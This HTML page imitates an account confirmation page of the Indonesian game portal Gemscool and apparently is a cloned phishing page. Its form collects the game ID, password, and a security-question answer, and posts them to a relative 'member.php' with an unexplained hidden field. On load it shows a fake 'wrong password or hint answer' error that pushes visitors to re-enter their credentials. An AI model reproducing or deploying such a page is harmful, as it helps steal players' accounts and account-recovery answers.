<html lang="en"><head>
    <meta charset="utf-8">
    <title>Gemscool Game Portal Pertama Di Indonesia</title>
<link rel="shortcut icon" href="http://img.gemscool.com/gemscool/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="IE=9,chrome=1">
    <meta name="description" content="">
    <meta name="author" content="">

    <!-- Le styles -->
    <link href="http://www.gemscool.com/assets/css/bootstrap.css" rel="stylesheet">
    <link href="http://www.gemscool.com/assets/css/bootstrap-responsive.css" rel="stylesheet">
	<link href="http://www.gemscool.com/assets/css/gemscool.css" rel="stylesheet">
		
		<link href="http://www.gemscool.com/assets/css/gemscool_2.css" rel="stylesheet">
	
			
	<!--[if IE 6]>  
	  <link href="http://www.gemscool.com/assets/css/ie6.css" rel="stylesheet">
	<![endif]-->  
	<!--[if IE 7]>  
	  <link href="http://www.gemscool.com/assets/css/ie7.css" rel="stylesheet">
	<![endif]-->  
	<!--[if IE 8]>  
	  <link href="http://www.gemscool.com/assets/css/ie8.css" rel="stylesheet">
	<![endif]-->  
	<!--[if IE 9]>  
	  <link href="http://www.gemscool.com/assets/css/ie9.css" rel="stylesheet">
	<![endif]-->  

	<!--[if IE 6]>
	<script src="http://www.gemscool.com/js/DD_belatedPNG_0.0.8a-min.js"></script>
	<script>
	  /* EXAMPLE */
	  DD_belatedPNG.fix('img');
	  DD_belatedPNG.fix('.png_bg');
	  
	  /* string argument can be any CSS selector */
	  /* .png_bg example is unnecessary */
	  /* change it to what suits you! */
	</script>
	<![endif]-->

	<link href="http://www.gemscool.com/assets/booklet/jquery.booklet.1.4.0.css" type="text/css" rel="stylesheet" media="screen, projection, tv">
	<style>#black_transparent{margin-top:20px;}.wrapper{margin-top: 20px;}</style>

    <!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>
      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	  <link href="http://www.gemscool.com/assets/css/gemscool_2_ie8.css" rel="stylesheet">
    <![endif]-->
	
	<!--[if IE 6]>
		<link href="http://www.gemscool.com/assets/css/gemscool_2_ie6.css" rel="stylesheet">
		<script type="text/javascript" src="http://www.gemscool.com/assets/js/DD_belatedPNG.js""></script>
		<script>DD_belatedPNG.fix('img,.gs_navi, .navi_voucher li.active, .title_forum, #list-games, .navi_news li.active,.arrow-down-news-games, .arrow-top-news-games');</script>
	<![endif]-->
	
	<!--[if IE 7]>
		<link href="http://www.gemscool.com/assets/css/gemscool_2_ie7.css" rel="stylesheet">
	<![endif]-->
	
	<!--link href="../css/gGemscool.msg.css" rel="stylesheet"-->
	<script type="text/javascript" src="../js/jquery-1.6.2.min.js"></script>
	<script type="text/javascript" src="../js/jquery-ui-1.8.14.custom.min.js"></script>
	<script type="text/javascript" src="../js/jquery.tinyscrollbar.min.js"></script>
	<script type="text/javascript" src="../js/common.js"></script>
	<script type="text/javascript" src="../js/kreonlab.js"></script>
	<script type="text/javascript" src="../js/gemscool.msg.js"></script>
	<script type="text/javascript" src="../js/gLayer.msg.js"></script>
	<script type="text/javascript" src="../js/kreonlab.exceptions.js"></script>
	<script type="text/javascript" src="../js/kreonlab.object.extension.js"></script>
	<!--script type="text/javascript" src="../js/simpleMessageLayer.js"></script-->
	<script type="text/javascript" src="http://ads.gemscool.com/advertisement/js/kreonlab.ads.ui.multipleframe-1.0.js"></script>
	<script type="text/javascript" src="http://ads.gemscool.com/advertisement/js/kreonlab.ads.ui.custom.logging-1.0.js"></script>

</head>

<body style="background: #600002 url('http://img.gemscool.com/gemscool/version_2013/bg_main2.png') no-repeat center top;">
<div class="container">
   		
	<div id="header2">
		
		<script src="http://www.gemscool.com/js/gLogin.js" type="text/javascript"></script>
<script type="text/javascript">
	$(document).ready(function() {
		$.ajax({
			dataType: "json",
			type: "POST",
			url: "http://www.gemscool.com/login/gs.login.profile.data.php",
			success: function(data)
			{
				$("#lbx_id").text(data.id+"!");
				if(data.loginType == "FACEBOOK" && data.gfb == "1") {
					$("#lbx_facebook").html("<a ><img src='http://img.gemscool.com/gemscool/img/btn/btn_face.png' alt='facebook' /></a>");
				}
				$("#login_cash").text(data.cash);
				$("#lbx_email").text(data.email);
				if(data.emailV == "Y"){
					$("#lbx_emailV").addClass("emailauth").text("(verifikasi selesai)");
				} else if (data.emailV == "W"){
					$("#lbx_emailV").addClass("emailnotauth").text("(sedang menunggu verifikasi)");
				} else {
					$("#lbx_emailV").addClass("emailnotauth").html("<a href='http://www.gemscool.com/member/profile.php'>(belum verifikasi)</a>");
				}
			},
			error : function(xhr, status, error) {
				//alert(xhr.responseText);
				// grapeMsgBox(xhr.responseText);
			}
		});
	
	});
</script>

	<div class="gs_login2">
		<ul>
			<li class="login">&nbsp;&nbsp;<a>Register Akun Here</a>&nbsp;&nbsp;</li>
		
			<li><a href="http://account.gemscool.com/member/logout.php?returnURL=http://www.gemscool.com/" style="color:#FFFFFF;"></a></li>
		</ul><!--[if IE 6]>  <div class="br_add"><br/></div>  <![endif]-->
	   <!--[if IE 7]>  <div class="br_add"><br/></div> <![endif]-->
	   <!--[if IE 8]>  <div class="br_add"></div> <![endif]-->
	   <!--[if IE 9]>  <div class="br_add"></div> <![endif]-->
	   <div id="gs_login2" class="logged">
	  
			<div class="box_login" style="margin-left:-10px">
	   
				  <label>&nbsp;&nbsp;Halo, Member Gemscool!</label>
				  <div class="row"></div>
				  <ul>
				 <li> <a href="http://www.gemscool.com/isiGcash/index.php"> MAU G-CASH ? </a>   <img src="http://img.gemscool.com/gemscool/version_2013/icon_gcash.png"><span class="point_gcash"> 100.000 </span> </li>
				 <li> 
					 <br>
														
									
				</li>
			  </ul>
				<div class="row"></div>
				<br>
				  <ul class="unit_member">
					 <li><a href="http://www.gemscool.com/isiGcash/index.php"><img src="http://img.gemscool.com/gemscool/version_2013/icon_logged_01.png"></a></li>
					 <li><a href="http://www.gemscool.com/isiGcash/cash_history.php"><img src="http://img.gemscool.com/gemscool/version_2013/icon_logged_02.png"></a></li>
					 <li><a href="http://www.gemscool.com/member/modify_pwd.php"><img src="http://img.gemscool.com/gemscool/version_2013/icon_logged_03.png"></a></li>
				  </ul>	

			</div>
		</div>
	</div>
	<!-- end login -->

		<div class="clear"></div>
		<div class="gs_logo_inside">
			<a href="http://www.gemscool.com/"><img src="http://img.gemscool.com/gemscool/version_2013/logo_gemscool_inside.png" alt="logo gemscool" title="gemscool official website"></a>
		</div> <!-- end logo -->

		<div class="gs_navi2 png_bg">
			<ul id="nav">
	<li><a id="m_allgames" href="index.php">ALL GAMES</a></li>
	<li><a href="http://www.gemscool.com/news/index.php">NEWS</a></li>
	<li><a href="http://klub.gemscool.com/">KLUB</a><div class="new_club_lain"><img src="http://img.gemscool.com/gemscool/version_2013/icon_new.png"></div></li>
	<li><a href="http://forum.gemscool.com">FORUM</a></li>
	<li><a href="http://www.gemscool.com/isiGcash/index.php">G-CASH</a></li>
	<li><a href="http://www.gemscool.com/down">DOWNLOAD</a></li>
	<li><a href="http://www.gemscool.com/ggp" <="" a="">
		</a><ul class="dropdown"><a href="http://www.gemscool.com/ggp" <="" a="">
			</a><li><a href="http://www.gemscool.com/ggp" <="" a=""></a><a href="http://www.gemscool.com/ggp">Game Guard Protection</a></li>
			<!--li><a href="http://www.gemscool.com/dvd">DVD Gratis</a></li-->
			<li><a href="http://forum.gemscool.com/ctgr/subForumList.forum?ctgrSq=8">Customer Service</a></li>
		</ul>
	</li>
		</ul></div> <!-- end navigation -->
	
	 </div>	
	<!-- end header -->

	<div id="allgames">
	<div class="listgames">
		<ul>
		<li><a href="http://mirrorwar.gemscool.com">
			<div class="lg_thumb"><img src="http://img.gemscool.com/gemscool/version_2013/logoMW.png"></div>
			<div class="lg_desc">
			<div class="lg_title">Mirror War</div>
			<div class="lg_meta">Mirror War Indonesia</div>
			</div>
			</a>				
		</li>
		<li><a href="http://pb.gemscool.com">
			<div class="lg_thumb"><img src="http://img.gemscool.com/gemscool/version_2013/lg_thumb1.png"></div>
			<div class="lg_desc">
			<div class="lg_title">Point Blank</div>
			<div class="lg_meta">Number 1 FPS in Indonesia</div>
			</div>
			</a>				
		</li>
		<li><a href="http://dn.gemscool.com">
			<div class="lg_thumb"><img src="http://img.gemscool.com/gemscool/version_2013/lg_thumb8.png"></div>
			<div class="lg_desc">
			<div class="lg_title">Dragont Nest</div>
			<div class="lg_meta">The Best 3D action MORPG</div>
			</div>
			</a>
		</li>
		<li><a href="http://atlantica.gemscool.com">
			<div class="lg_thumb"><img src="http://img.gemscool.com/gemscool/version_2013/lg_thumb7.png"></div>
			<div class="lg_desc">
			<div class="lg_title">Atlantica</div>
			<div class="lg_meta">Strategi MMORPG</div>
			</div>
			</a>
		</li>
		<li><a href="http://eligium.gemscool.com">
			<div class="lg_thumb"><img src="http://img.gemscool.com/gemscool/version_2013/lg_thumb9.png"></div>
			<div class="lg_desc">
			<div class="lg_title">Eligium</div>
			<div class="lg_meta">[MMORPG] Infinite PK and Faction War</div>
			</div>
			</a>
		</li>
		<li><a href="http://yulgang.gemscool.com">
			<div class="lg_thumb"><img src="http://img.gemscool.com/gemscool/version_2013/lg_thumb2.png"></div>
			<div class="lg_desc">
			<div class="lg_title">Yulgang Online</div>
			<div class="lg_meta">Comic MMORPG</div>
			</div></a>

		</li>
		<li><a href="http://cabal.zbox.co.id">
			<div class="lg_thumb"><img src="http://img.gemscool.com/gemscool/version_2013/lg_thumb10.png"></div>
			<div class="lg_desc">
			<div class="lg_title">Cabal</div>
			<div class="lg_meta">Revolution of Action</div>
			</div>
		</a>
		</li>
		<li><a href="http://lostsaga.gemscool.com">
			<div class="lg_thumb"><img src="http://img.gemscool.com/gemscool/version_2013/lg_thumb4.png"></div>
			<div class="lg_desc">
			<div class="lg_title">Lost Saga</div>
			<div class="lg_meta">Jagoan Baru Telah Datang</div>
			</div>
			</a>
		</li>
		<li><a href="http://aow.zbox.co.id">
			<div class="lg_thumb"><img src="http://img.gemscool.com/gemscool/version_2013/lg_thumb11.png"></div>
			<div class="lg_desc">
			<div class="lg_title">Age of Wushu</div>
			<div class="lg_meta">MMORPG Era Baru</div>
			</div>
			</a>
		</li>
		<li><a href="http://fs.gemscool.com">
			<div class="lg_thumb"><img src="http://img.gemscool.com/gemscool/version_2013/lg_thumb6.png"></div>
			<div class="lg_desc">
			<div class="lg_title">Free Style</div>
			<div class="lg_meta">Play Street Basketball</div>
			</div>
			</a>
		</li>

		<li><a href="http://kartrider.gemscool.com">
			<div class="lg_thumb"><img src="http://img.gemscool.com/gemscool/version_2013/lg_thumb3.png"></div>
			<div class="lg_desc">
			<div class="lg_title">Kart Rider</div>
			<div class="lg_meta">Drift 4 Win</div>
			</div>
			</a>
		</li>
		<li>
			<div class="lg_thumb"><img src="http://img.gemscool.com/gemscool/version_2013/lg_thumbc.png"></div>
			<div class="lg_desc">
			<div class="lg_title">Coming Soon</div>
			<div class="lg_meta">coming soon</div>
			</div>

		</li>
		<!--	<li><a href="#">
		<div class="lg_thumb"><img src="$IMG['gemscool']?>lg_thumb5.png"/></div>
		<div class="lg_desc">
		<div class="lg_title">Mako</div>
		<div class="lg_meta">Card Battle Game</div>
		</div>
		</a>
		</li> -->
		</ul>
	</div>
	<div class="bannergames">
		<script type="text/javascript" src="http://ads.gemscool.com/advertisement/js/kreonlab.ads.ui.multipleframe-1.0.js"></script>
<script type="text/javascript" src="http://ads.gemscool.com/advertisement/ads/req.ads?serviceCode=WEB&amp;adTypeSeq=113&amp;userId=kira32&amp;userCn=716116&amp;memberType=normal"></script><iframe id="adHiddenFrame_113" onload="ad.logging.complete(this);" style="display:none;" src="http://log.gemscool.com/message/ad.msg?method=view&amp;id=kira32&amp;cn=716116&amp;userIp=10.6.51.33&amp;httpReferer=&amp;memberType=normal&amp;serviceCode=WEB&amp;adTypeSeq=113&amp;ruleSeq=100&amp;adSeq=1042"></iframe><img width="316" height="317" limit="3" current="0" id="adImage_1042" style="cursor:pointer;" src="http://img.gemscool.com/service/AD/adtype_113/1042_20130418.jpg">	</div>
</div> <!-- end allgames -->	
</div><script type="text/javascript">

$(document).ready(function() {
		showMsg("Telah terjadi error seperti dibawah ini saat memproses<br />penggabungan anggota baru menggunakan informasi yang<br />anda masukkan. Silahkan cek kembali informasi yang anda masukkan.<br /><br />[E203] Password atau Hint Answer yang Anda masukkan salah",'','Konfirmasi Password');

	$("#password").focus();

});

function submitChk(){
	if($("#id").val().trim() == "" ) {
		showMsg("Anda tidak memasukkan ID Gemscool.",$("#id"),'Konfirmasi ID Gemscool');
		return;
	}
	
	if($("#password").val().trim() == "" ) {
		showMsg("Anda tidak memasukkan Password.",$("#password"),'Konfirmasi Password');
		return;
	}
	
	if($("#answer").val().trim() == "" ) {
		showMsg("Anda tidak memasukkan Hint Answer.",$("#answer"),'Konfirmasi Password');
		return;
	}
	
	$("#frmPwd").submit();
}

</script>	

<div class="container">
	<div class="clear"></div>
<div class="wrapper">
	<div id="box_content">
		<div id="title_box">KONFIRMASI DATA AKUN</div>
		<form id="frmPwd" name="frmPwd" method="post" action="member.php">
		<input type="hidden" name="aderizkip" value="aderizkip">
		<input type="hidden" name="id" value="">
		<div id="box_white">
			<p class="muted">Masukkan semua data dengan benar terlebih dahulu untuk<br>dapat mengakses informasi pribadimu!.<br></p>
			<div id="box_form">
				<p class="lb_field">ID Gemscool</p>
        		<input class="field" type="text" id="id" name="id" maxlength="20" onkeypress="if(event.keyCode == 13){submitChk()}">
				<p class="lb_field">Password</p>
        		<input class="field" type="password" id="password" name="password" maxlength="20" onkeypress="if(event.keyCode == 13){submitChk()}">
			</div>
			<div class="clear"></div>
			<div id="box_form4">
			<p class="lb_field">Password  Hint</p>
			<select class="droplist" id="hint" name="hint">
									<option selected="" value="Apa nama hewan pemeliharaan anda?">Apa nama hewan pemeliharaan anda?</option>
									<option value="Apakah warna kesukaan anda?">Apakah warna kesukaan anda?</option>
									<option value="Siapakah nama ibu kandung anda?">Siapakah nama ibu kandung anda?</option>
									<option value="Apa nama terakhir guru favorit anda?">Apa nama terakhir guru favorit anda?</option>
									<option value="Apa makanan favorit Anda sebagai seorang anak?">Apa makanan favorit Anda sebagai seorang anak?</option>
									<option value="Apa nama terakhir dari bos pertama Anda?">Apa nama terakhir dari bos pertama Anda?</option>
									<option value="Apa nama rumah sakit di mana Anda dilahirkan?">Apa nama rumah sakit di mana Anda dilahirkan?</option>
									<option value="Apa nama tim olahraga favorit Anda?">Apa nama tim olahraga favorit Anda?</option>
									<option value="Apa nama buku favorit Anda?">Apa nama buku favorit Anda?</option>
									<option value="Apa nama terakhir dari musisi favorit Anda?">Apa nama terakhir dari musisi favorit Anda?</option>
									<option value="Apa nama mobil pertama Anda?">Apa nama mobil pertama Anda?</option>
							</select>
			<p class="lb_field">Hint Answer</p>
			<input class="field" type="text" id="answer" name="answer" value="" maxlength="200">
			<div class="caution_text">
				<p>* Password Hint &amp; Hint Answer yang berlaku adalah<br>Password Hint &amp; Hint Answer pertama Anda<br></p>

			</div>
			<div class="button_confirm">
			<input type="submit" value="KIRIM" class="button3" title="KIRIM" onclick="submitLoginGemscool()">
			</div>
			</div>
		</div>
		<div id="box_right">
			<div class="banner_right2">
				<script type="text/javascript" src="http://ads.gemscool.com/advertisement/js/kreonlab.ads.ui.multipleframe-1.0.js"></script>
<script type="text/javascript" src="http://ads.gemscool.com/advertisement/ads/req.ads?serviceCode=WEB&amp;adTypeSeq=117&amp;userId=kira32&amp;userCn=716116&amp;memberType=normal"></script><iframe id="adHiddenFrame_117" onload="ad.logging.complete(this);" style="display:none;" src="http://log.gemscool.com/message/ad.msg?method=view&amp;id=kira32&amp;cn=716116&amp;userIp=10.6.51.33&amp;httpReferer=&amp;memberType=normal&amp;serviceCode=WEB&amp;adTypeSeq=117&amp;ruleSeq=100&amp;adSeq=1101"></iframe><img width="309" height="271" limit="3" current="0" id="adImage_1101" style="cursor:pointer;" src="http://img.gemscool.com/service/AD/adtype_117/1101_20130424.jpg">			</div>
		</div>
		<div class="clear"></div>
	</form></div>
</div>
</div>


<!-- start footer -->
<div id="footer">
	<div class="conteiner">
		<div class="wrapper">
			<div class="foot_left">
				<div class="logo_foot"><img src="http://img.gemscool.com/gemscool/version_2013/gs__51.png" alt="LOGO KREON"></div>
				<p>
					Gedung Gandaria 8 Lt.20 Unit B-C, Gandaria City Jl.Sultan Iskandar Muda Kebayoran Lama<br> Jakarta Selatan, Telp. 021-29303499
				</p>
				<p class="copyright">
					Copyright (C) 2013 PT. KREON. All Right Reserved.
				</p>
			</div>
			
			<div class="foot_right">
				CONNECT WITH US 
				<a href="https://www.facebook.com/gemscool.official"><img src="http://img.gemscool.com/gemscool/version_2013/gs__55.png"></a>    
				<a href="https://twitter.com/GemscoolKreon"><img src="http://img.gemscool.com/gemscool/version_2013/gs__54.png"></a> 
				<a href="http://www.youtube.com/user/gemscoolkreon"><img src="http://img.gemscool.com/gemscool/version_2013/gs__56.png"></a> 
			</div>
			
			<div class="foot_family">
			  FAMILY SITES
				<a href="http://zbox.co.id" target="_blank"><img src="http://img.gemscool.com/gemscool/version_2013/logo_zbox.png"></a>
				<a href="http://gwarnet.com" target="_blank"><img src="http://img.gemscool.com/gemscool/version_2013/logo_gwarnet.png"></a>
				<a href="http://gvoucher.co.id" target="_blank"><img src="http://img.gemscool.com/gemscool/version_2013/logo_gvoucher.png"></a>
			</div>
		
		</div>
	</div>	
</div>

<script>var BASE_URL = "http://www.gemscool.com/"; </script>
<!--script src="http://www.gemscool.com/js/jquery.js" type="text/javascript"></script-->
<!--script src="http://www.gemscool.com/assets/roslide/jquery.royalslider.min.js?v=9.3.5"></script-->
<script>
  var subsubmenu = function (){
    this.navLi=$('#nav > li').children('ul').css('display', 'none').end();
    this.init();
  };

  subsubmenu.prototype={
    init : function(){
      this.setMenu();
    },
    
    //Memberikan efek slide
    
    setMenu: function(){
      this.navLi.hover(function(){
      //mouseover
        $(this).find('>ul').stop(true,true).slideDown(250);
      }, function(){
      //mouseout
        $(this).find('>ul').stop(true,true).slideUp(200);
      });
    }
  
}

new subsubmenu();
</script>
<!--script src="http://www.gemscool.com/js/jquery.cycle2.js"></script>
<script src="http://www.gemscool.com/js/jquery.cycle2.carousel.js"></script>
<script src="http://www.gemscool.com/js/jquery.cycle2.tile.js"></script-->

<script src="http://www.gemscool.com/js/jquery-ui.min.js" type="text/javascript"></script>
<!--script src="http://www.gemscool.com/assets/booklet/jquery.easing.1.3.js" type="text/javascript"></script>
<script src="http://www.gemscool.com/assets/booklet/jquery.booklet.1.4.0.min.js" type="text/javascript"></script-->
<!--[if lte IE 6]>
<script src="http://www.gemscool.com//code/booklet/-/js/DD_belatedPNG.js" type="text/javascript"></script>
<script type="text/javascript">  
DD_belatedPNG.fix("h1 a, .b-shadow-f, .b-shadow-b, .b-p0, .b-p3, .b-arrow-next div, .b-arrow-prev div");  
</script>  
<![endif]--> 
<!--script src="http://www.gemscool.com/assets/booklet/jquery.shiningImage.js" type="text/javascript"></script-->

<!-- Slider Kit styles -->
<!--link rel="stylesheet" type="text/css" href="http://www.gemscool.com/assets/css/sliderkit-core.css" media="screen, projection" />
<link rel="stylesheet" type="text/css" href="http://www.gemscool.com/assets/css/sliderkit-demos.css" media="screen, projection" /-->
<!--script src="http://www.gemscool.com/js/jquery.mousewheel.min.js" type="text/javascript"></script--> 
<!--script src="http://www.gemscool.com/js/jquery.sliderkit.1.9.2.pack.js" type="text/javascript"></script-->
<!-- Slider Kit launch -->
<!--script type="text/javascript">
$(window).load(function(){ //$(window).load() must be used instead of $(document).ready() because of Webkit compatibility       
	 // News slider > Horizontal
	$(".newslider-horizontal").sliderkit({
	  auto:true,
	  shownavitems:3,
	  panelfx:"sliding",
	  panelfxspeed:1000,
	  panelfxeasing:"easeInOutExpo", //"easeOutExpo", "easeOutCirc", etc.
	  mousewheel:true,
	  keyboard:true,
	  fastchange:false
	});
}); 
</script-->

<script>
/*
jQuery(document).ready(function($){
	var slideshows = $('.cycle-slideshow').on('cycle-next cycle-prev', function(e, opts) {
		// advance the other slideshow
		slideshows.not(this).cycle('goto', opts.currSlide);
	});
	$('#cycle-2 .cycle-slide').click(function(){
		var index = $('#cycle-2').data('cycle.API').getSlideIndex(this);
		slideshows.cycle('goto', index);
	});
});

$(function() {
	$('#mybook').booklet({
		hash: true,
		width:  330,
		height: 175,
		pageNumbers: false,
		pagePadding: 0
	});
});
*/
jQuery(document).ready(function($) {
 
	//rollover swap images with rel 
	var img_src = "";
	var new_src = "";
	var undefined_canvas='';

	$('#allgames').hide();
	$('#m_allgames').removeClass('lg_active');
	$('#gs_login').hide();
	
	rollover('#imgaa');
	rollover('#imga');
	rollover('#imgb');
	rollover('#imgc');
	rollover('#imgd');
	rollover('#imge');
	rollover('#imgf');
	rollover('#imgg');
	rollover('#imgh');
	rollover('#imgi');
	rollover('#imgj');
	rollover('#imgk');
	rollover('#imgl');

	function rollover(farsx){
		$(farsx).hover(function(){
		  //mouseover
		  img_src = $(this).attr('src'); //grab original image
		  new_src = $(this).attr('rel'); //grab rollover image
		  $(this).attr('src', new_src); //swap images
		  $(this).attr('rel', img_src); //swap images

		  $('.adipoli-after img').attr('src', new_src);
		  
		  //$(this).data('shiningImage').shine();
		 // $(this).shiningImage();
		   $(farsx).show();
		  // $(farsx+'_canvas').show();
		},
		function(){   
		  //mouse out
		  $(this).attr('src', img_src); //swap images
		  $(this).attr('rel', new_src); //swap images 
		  $(this).show(); 
		 // $(farsx+'_canvas').hide(); 	  	 
		}); 
	}
});

$('html,.container').bind('mouseleave click',function() {
	$('#allgames').hide();
	$('#m_allgames').removeClass('lg_active');
	$('#gs_login').hide();$('.gs_login ul li').css(('padding-top'),0);$('.login').removeClass('log_active'); $('.br_add').html('');
	$('#gs_login2').hide();$('.gs_login2 ul li').css(('padding-top'),0);$('.login').removeClass('log_active'); $('.br_add').html('');
	$('.login a').css('color','#fff');
});

$('#m_allgames').mouseover(function(event){
    $('.login').removeClass('log_active');
    $('.br_add').html('');

    event.stopPropagation();
  $('#m_allgames').addClass('lg_active');
    var panel = $('#allgames');
     if ( ! panel.is(':visible')) {
      $('#gs_login').hide();
	  $('#gs_login2').hide();
      $('#allgames').show();
    } else {
        $('#allgames').hide();
        $('#m_allgames').removeClass('lg_active');
    } 
 });
$('#allgames,#gs_login,#gs_login2').click(function(event){
   event.stopPropagation();
});

$('.login').click(function(event){
	$('.login a').css('color','#000');
   event.stopPropagation();
  $('.login').addClass('log_active');
    $('.gs_login ul li').css(('padding-top'), 10);
	$('.gs_login2 ul li').css(('padding-top'), 10);

    var panel = $('#gs_login');
    if ( ! panel.is(':visible')) {
        $('#allgames').hide();$('#m_allgames').removeClass('lg_active');
        $('.br_add').html('<br/><br/>');
      $('#gs_login').show();
    } else {
         $('.gs_login ul li').css(('padding-top'),0);
         $('.br_add').html('');
         $('#gs_login').hide();
         $('.login').removeClass('log_active');
    }
	
	var panel = $('#gs_login2');
    if ( ! panel.is(':visible')) {
        $('#allgames').hide();$('#m_allgames').removeClass('lg_active');
        $('.br_add').html('<br/><br/>');
   		$('#gs_login2').show();
    } else {
         $('.gs_login2 ul li').css(('padding-top'),0);
         $('.br_add').html('');
         $('#gs_login2').hide();
         $('.login').removeClass('log_active');
    }	

 });
</script>
<!--script src="http://www.gemscool.com/assets/js/jquery.adipoli.min.js" type="text/javascript"></script> 
<script type="text/javascript">      
$(function(){
	$('.row1').adipoli({
		'startEffect' : 'normal',
		'hoverEffect' : 'popout'
	});
	$('.row2').adipoli({
		'startEffect' : 'overlay',
		'hoverEffect' : 'sliceDown'
	});
	$('.row3').adipoli({
		'startEffect' : 'transparent',
		'hoverEffect' : 'boxRandom'
	});
	$('.row4').adipoli({
		'startEffect' : 'overlay',
		'hoverEffect' : 'foldLeft'
	});
$('.row5').adipoli({
	'startEffect' : 'transparent',
	'hoverEffect' : 'boxRainGrowReverse'
});
$('.row6').adipoli({
	'startEffect' : 'grayscale',
	'hoverEffect' : 'normal'
});
});     
</script-->
<!--script>
jQuery(document).ready(function($) {
	  var opts = {
		controlNavigation:'thumbnails',
		imageScaleMode: 'fill',
		arrowsNav: false,
		arrowsNavHideOnTouch: true,
		fullscreen: false,
		loop: false,
		thumbs: {
		  firstMargin: false,
		  paddingBottom: 0
		},
		autoPlay: {
		  enabled: true,
		  delay: 2000
		},
		block: {
    		// animated blocks options go gere
    		fadeEffect: false,
    		moveEffect: 'left'
    	},
		numImagesToPreload: 4,
		thumbsFirstMargin: false,
		autoScaleSlider: true, 
		autoScaleSliderWidth: 960,     
		autoScaleSliderHeight: 600,
		keyboardNavEnabled: true,
		navigateByClick: true,
		fadeinLoadedSlide: true
	  };
	  if(!$.browser.webkit) {
		opts.imgWidth = 707;
		opts.imgHeight = 397;
	  }
	  var sliderJQ = $('#homeSlider').royalSlider(opts);
});
</script-->
	
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));</script><script src="http://www.google-analytics.com/ga.js" type="text/javascript"></script>
<script type="text/javascript">var pageTracker = _gat._getTracker("UA-5610726-3");pageTracker._trackPageview();</script>
</body></html>
